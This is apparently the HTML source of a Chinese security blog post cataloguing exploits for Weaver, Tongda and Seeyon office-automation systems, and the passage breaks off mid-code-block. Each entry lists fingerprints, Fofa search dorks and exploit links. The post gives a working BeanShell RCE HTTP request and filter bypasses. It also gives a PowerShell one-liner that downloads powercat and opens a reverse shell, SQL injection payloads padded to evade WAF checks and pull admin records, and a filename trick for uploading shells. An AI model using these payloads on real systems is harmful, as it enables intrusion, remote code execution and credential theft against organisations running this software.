&lt;p&gt;1.这里 &lt;code&gt;Xstream&lt;/code&gt; 同样影响很多使用它的开源组件, 比如&lt;code&gt;Spring&lt;/code&gt;系列&lt;/p&gt;
&lt;p&gt;Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)
&lt;a class=&#34;link&#34; href=&#34;https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.xml 不仅可以xxe, 还能反序列化代码执行&lt;/p&gt;
&lt;p&gt;2.xxe 漏洞用 &lt;code&gt;xxer&lt;/code&gt;, 方便快捷&lt;/p&gt;
&lt;p&gt;TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.
&lt;a class=&#34;link&#34; href=&#34;https://github.com/TheTwitchy/xxer&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/TheTwitchy/xxer&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;泛微oa-bsh-远程代码执行漏洞&#34;&gt;泛微OA Bsh 远程代码执行漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
泛微OA&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Set-Cookie: ecology_JSessionId=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ecology&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/weaver/bsh.servlet.BshServlet&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;泛微-协同办公OA&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/215218.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/215218.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/beanshell/beanshell&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/beanshell/beanshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis
&lt;a class=&#34;link&#34; href=&#34;https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST /weaver/bsh.servlet.BshServlet HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: xxxxxxxx:8088
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: */*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Language: en
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: close
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 98
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/x-www-form-urlencoded
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bsh.script=eval%00(&amp;#34;ex&amp;#34;%2b&amp;#34;ec(\&amp;#34;whoami\&amp;#34;)&amp;#34;);&amp;amp;bsh.servlet.captureOutErr=true&amp;amp;bsh.servlet.output=raw
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.其他形式绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;eval%00(&amp;quot;ex&amp;quot;%2b&amp;quot;ec(\&amp;quot;whoami\&amp;quot;)&amp;quot;);&lt;/code&gt; 也可以换成 &lt;code&gt;ex\u0065c(&amp;quot;cmd /c dir&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.泛微多数都是windows环境, 反弹shell可以使用pcat&lt;/p&gt;
&lt;p&gt;&lt;code&gt;powershell IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c ip -p 6666 -e cmd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新泛微补丁&lt;/p&gt;
&lt;p&gt;2.拦截&lt;code&gt;/weaver/bsh.servlet.BshServlet&lt;/code&gt;目录的访问&lt;/p&gt;
&lt;h2 id=&#34;泛微oa-e-cology-sql注入漏洞&#34;&gt;泛微OA e-cology SQL注入漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC &lt;a class=&#34;link&#34; href=&#34;https://weaversrc.vulbox.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://weaversrc.vulbox.com/&lt;/a&gt;, 情况有所好转&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泛微OA&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Set-Cookie: ecology_JSessionId=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ecology&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WorkflowCenterTreeData&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/mobile/plugin/SyncUserInfo.jsp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;泛微-协同办公OA&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/6531&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/6531&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现&lt;em&gt;数据库&lt;/em&gt;小龙人-CSDN博客
&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/zycdn/article/details/102494037&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/zycdn/article/details/102494037&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle
&lt;a class=&#34;link&#34; href=&#34;https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园
&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/AtesetEnginner/p/11558469.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cnblogs.com/AtesetEnginner/p/11558469.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/mobile/plugin/SyncUserInfo.jsp&lt;/code&gt; 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了&lt;/p&gt;
&lt;p&gt;2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了&lt;/p&gt;
&lt;p&gt;3.这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过&lt;code&gt;xssMaxLength=500&lt;/code&gt;的时候就不进入安全检测, 修复以后是&lt;code&gt;xssMaxLength=1000000&lt;/code&gt;, 所以随便你填充&lt;code&gt;%0a%0d&lt;/code&gt;还是&lt;code&gt;空格&lt;/code&gt;都可以绕过注入检测&lt;/p&gt;
&lt;p&gt;4.泛微后端数据库版本存在差异, 但是可以通用检测&lt;/p&gt;
&lt;p&gt;已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致&lt;/p&gt;
&lt;p&gt;所以这里筛选出一个相对通用的检测手法(下面代码是python的&lt;code&gt;&amp;quot; &amp;quot;*800&lt;/code&gt; 800个空格)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;-1) &amp;quot;+&amp;quot; &amp;quot;*800+ &amp;quot;union select/**/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=(&#39;sysadmin&#39;&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;老版本可以在关键字后面加 &lt;code&gt;/**/&lt;/code&gt; 来绕过sql检测&lt;/p&gt;
&lt;p&gt;新版本可以通过加入大量空格/换行来绕过sql检测&lt;/p&gt;
&lt;p&gt;mssql, oracle中都有&lt;code&gt;Hrmresourcemanager&lt;/code&gt; , 这是管理员信息表&lt;/p&gt;
&lt;p&gt;就&lt;code&gt;Hrmresource&lt;/code&gt;表中没有用户, &lt;code&gt;Hrmresourcemanager&lt;/code&gt; 表中也一定会存在&lt;code&gt;sysadmin&lt;/code&gt;账户&lt;/p&gt;
&lt;p&gt;所以进行&lt;code&gt;union select&lt;/code&gt;的时候一定会有数据&lt;/p&gt;
&lt;p&gt;这里也可以使用 &lt;code&gt;&amp;quot;-1) &amp;quot;+&amp;quot; &amp;quot;*800+ &amp;quot; or/**/ 1=1 and id&amp;lt;(5&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里使用 &lt;code&gt;&amp;lt;5&lt;/code&gt; 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新泛微补丁
2.泛微最好不要开放到公网
3.使用waf拦击&lt;/p&gt;
&lt;h2 id=&#34;泛微oa-数据库泄露漏洞&#34;&gt;泛微OA 数据库泄露漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC &lt;a class=&#34;link&#34; href=&#34;https://weaversrc.vulbox.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://weaversrc.vulbox.com/&lt;/a&gt;, 情况有所好转&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泛微OA&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Set-Cookie: ecology_JSessionId=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ecology&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/mobile/DBconfigReader.jsp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;泛微-协同办公OA&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞
&lt;a class=&#34;link&#34; href=&#34;https://github.com/jas502n/DBconfigReader&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/jas502n/DBconfigReader&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing
&lt;a class=&#34;link&#34; href=&#34;https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 &lt;code&gt;pyDes.des(&#39; &#39;)&lt;/code&gt;
2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了
3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新泛微补丁&lt;/p&gt;
&lt;p&gt;2.泛微最好不要开放到公网&lt;/p&gt;
&lt;p&gt;3.使用waf拦截sql注入&lt;/p&gt;
&lt;h2 id=&#34;通达oa-远程代码执行漏洞&#34;&gt;通达OA 远程代码执行漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
通达OA&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;/images/tongda.ico&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Office Anywhere 20xx版 网络智能办公系统&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/ispirit/interface/gateway.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;通达OA&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note
&lt;a class=&#34;link&#34; href=&#34;https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools
&lt;a class=&#34;link&#34; href=&#34;https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note
&lt;a class=&#34;link&#34; href=&#34;https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞
&lt;a class=&#34;link&#34; href=&#34;https://github.com/NS-Sp4ce/TongDaOA-Fake-User&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/NS-Sp4ce/TongDaOA-Fake-User&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell
&lt;a class=&#34;link&#34; href=&#34;https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有&lt;/p&gt;
&lt;p&gt;绕过disable_function也很简单, 直接调用&lt;code&gt;COM(&#39;WScript.shell&#39;)&lt;/code&gt;组件就ok了&lt;/p&gt;
&lt;p&gt;2.文件名结构规则如下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;256@2003_ 2055499620|123. php.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对应文件名为&lt;/p&gt;
&lt;p&gt;&lt;code&gt;attach/im/2003/2055499620.123.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为是windows的, &lt;code&gt;1.php.&lt;/code&gt; 可以绕过黑名单, 写到文件就成了 &lt;code&gt;1.php&lt;/code&gt; (&lt;del&gt;这里是文件包含, 文件名无所谓&lt;/del&gt;)&lt;/p&gt;
&lt;p&gt;3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个&lt;/p&gt;
&lt;p&gt;(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)&lt;/p&gt;
&lt;p&gt;通达OA前台任意用户伪造登录漏洞
&lt;a class=&#34;link&#34; href=&#34;https://vas.riskivy.com/vuln-detail?id=33&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://vas.riskivy.com/vuln-detail?id=33&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞
&lt;a class=&#34;link&#34; href=&#34;https://github.com/NS-Sp4ce/TongDaOA-Fake-User&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/NS-Sp4ce/TongDaOA-Fake-User&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.使用waf拦截&lt;/p&gt;
&lt;h2 id=&#34;致远-oa-a8-htmlofficeservlet-getshell-漏洞&#34;&gt;致远 OA A8 htmlofficeservlet getshell 漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
致远 OA&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/seeyon/htmlofficeservlet&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/seeyon/index.jsp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;seeyon&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;用友-致远OA&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;致远 OA A8 htmlofficeservlet getshell (POC&amp;amp;EXP) – Reber’s Blog
&lt;a class=&#34;link&#34; href=&#34;http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list
&lt;a class=&#34;link&#34; href=&#34;https://github.com/timwhitez/seeyon-OA-A8-GetShell&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/timwhitez/seeyon-OA-A8-GetShell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;致远 OA A8 htmlofficeservlet getshell (POC&amp;amp;EXP) – Reber’s Blog
&lt;a class=&#34;link&#34; href=&#34;http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里还有个XXE&lt;/p&gt;
&lt;p&gt;致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog
&lt;a class=&#34;link&#34; href=&#34;https://landgrey.me/blog/8/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://landgrey.me/blog/8/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题&lt;/p&gt;
&lt;p&gt;这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊&lt;/p&gt;
&lt;p&gt;这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
